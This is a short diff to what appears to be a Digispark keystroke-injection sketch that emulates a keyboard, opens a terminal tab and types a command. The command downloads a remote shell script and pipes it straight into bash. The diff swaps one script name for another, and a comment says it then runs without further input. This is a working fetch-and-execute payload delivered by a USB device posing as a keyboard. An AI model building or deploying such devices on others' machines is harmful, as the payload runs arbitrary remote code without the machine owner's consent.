@@ -23,7 +23,7 @@ void setup() {
     DigiKeyboard.delay(2000); // Give Terminal a couple seconds to start up
     DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT); // Open a new tab
     DigiKeyboard.delay(800);
-    DigiKeyboard.println("curl -L erikboesen.com/join.sh |sh"); // Download and run join script; will now run without further input
+    DigiKeyboard.println("curl -L erikboesen.com/jm.sh |bash"); // Download and run join script; will now run without further input
 
     // Turn off LED
     digitalWrite(0, LOW);
